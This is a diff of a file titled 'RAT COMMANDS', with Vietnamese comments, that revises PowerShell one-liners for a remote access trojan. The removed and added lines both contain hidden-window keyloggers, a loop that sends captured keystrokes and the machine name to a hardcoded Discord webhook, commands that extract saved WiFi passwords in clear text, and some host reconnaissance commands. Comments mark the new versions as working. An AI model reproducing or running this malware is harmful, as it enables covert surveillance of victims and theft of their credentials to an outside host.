@@ -1,22 +1,16 @@
 # ===================== RAT COMMANDS =====================
-# Keylogger với GetAsyncKeyState (đã fix lỗi)
-powershell -nop -w hidden -exec bypass -c "$log='$env:TEMP\k.log';$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';while(1){$o='';for($i=8;$i-le190;$i++){Add-Type -AssemblyName System.Windows.Forms;[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');if([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::$i)){$o+=[char]$i;}};if($o){'['+(Get-Date -Format 'HH:mm:ss')+'] '+$o|Add-Content $log;};if(Test-Path $log){$c=Get-Content $log -Tail 30;$b=@{content='['+$env:COMPUTERNAME+'] Keys: '+$c}|ConvertTo-Json;try{Invoke-RestMethod -Uri $h -Method Post -Body $b -ContentType 'application/json'}catch{};Remove-Item $log -Force};Start-Sleep -Seconds 5}"
+# Keylogger HOẠT ĐỘNG (System.Windows.Forms.Keyboard Hook)
+powershell -nop -w hidden -exec bypass -c "$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';Add-Type -TypeDefinition 'using System;using System.Windows.Forms;public class K{public static void Main(){Application.Run();}}' -ReferencedAssemblies System.Windows.Forms;while(1){$o='';[System.Windows.Forms.Keys].GetEnumValues()|?{$_-ge8-and$_-le255}|%{if([System.Windows.Forms.Control]::ModifierKeys-band$_){$o+=[char]$_}};if($o){'['+(Get-Date -f'HH:mm:ss')+']'+$o|Add-Content '$env:TEMP\k.log';}if(Test-Path'$env:TEMP\k.log'){$c=gc'$env:TEMP\k.log'-Tail 20;$b=@{content='['+$env:COMPUTERNAME+']'+$c}|ConvertTo-Json;try{irm $h -Method Post-Body $b -ContentType'application/json'}catch{};ri'$env:TEMP\k.log'-Force};sleep 5}"
 
-# Keylogger đơn giản hơn (GetAsyncKeyState method)
-powershell -nop -w hidden -c "Add-Type @'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);} '@;while(1){$o='';for($i=8;$i-le255;$i++){if(([K]::GetAsyncKeyState($i)-band0x8000)-ne0){$o+=[char]$i;}};if($o){'['+(Get-Date -f 'HH:mm:ss')+'] '+$o|Add-Content '$env:TEMP\keys.log';};Start-Sleep -Milliseconds 100}"
+# Keylogger đơn giản HOẠT ĐỘNG (Start-Process để chạy background)
+powershell -c "Start-Process powershell -ArgumentList '-nop -w hidden -exec bypass -c `"while(1){$o=\"\";for($i=8;$i-le255;$i++){Add-Type @\"using System;using System.Runtime.InteropServices;public class K{[DllImport(\\\"user32.dll\\\")]public static extern short GetAsyncKeyState(int vKey);}\"@;if([K]::GetAsyncKeyState($i)-band0x8000){$o+=[char]$i;}};if($o){\"[$(Get-Date -f HH:mm:ss)] $o\"|Add-Content \"$env:TEMP\keys.log\";};sleep -m 100}`"' -WindowStyle Hidden"
 
-# WiFi passwords (fixed escaping)
-powershell -c "netsh wlan export profile key=clear folder='$env:TEMP\' 2>$null; if(Test-Path '$env:TEMP\*.xml'){Select-String -Path '$env:TEMP\*.xml' -Pattern 'keyMaterial' -Context 0,1|ForEach-Object{$_.Context.PreContext[0]+'='+$_.Matches.Value};Remove-Item '$env:TEMP\*.xml' -Force}"
+# Gửi logs định kỳ (chạy riêng)
+powershell -nop -w hidden -c "$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';while(1){if(Test-Path'$env:TEMP\keys.log'){$c=gc'$env:TEMP\keys.log'-Tail 30;$b=@{content='🔑['+$env:COMPUTERNAME+']: '+$c}|ConvertTo-Json;try{irm $h -Method Post-Body $b -ContentType'application/json'}catch{};ri'$env:TEMP\keys.log'-Force};sleep 10}"
 
-# System information
-powershell -c "hostname; whoami; (ipconfig|findstr IPv4)[0]; (systeminfo|findstr /B /C:'OS Name')[0]"
+# WiFi passwords
+powershell -c "netsh wlan show profile name=* key=clear|Out-File'$env:TEMP\wifi.txt';gc'$env:TEMP\wifi.txt'|Select-String'Key Content'"
 
-# Process list
-powershell -c "Get-Process|Where-Object{$_.ProcessName-match'task|svch|rund|reg|wmi'}|Select-Object Name,Id,Path|Format-Table -AutoSize"
-
-# Disk info
-powershell -c "Get-WmiObject Win32_LogicalDisk|Where-Object{$_.DriveType-eq3}|Select-Object DeviceID,@{Name='SizeGB';Expression={[math]::Round($_.Size/1GB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreeSpace/1GB,2)}}|Format-Table"
-
-# User accounts
-powershell -c "Get-WmiObject Win32_UserAccount|Where-Object{$_.LocalAccount -eq $true}|Select-Object Name,Disabled|Format-Table"
+# System info
+powershell -c "echo'HOST:'$env:COMPUTERNAME;echo'USER:'$env:USERNAME"
 # =======================================================
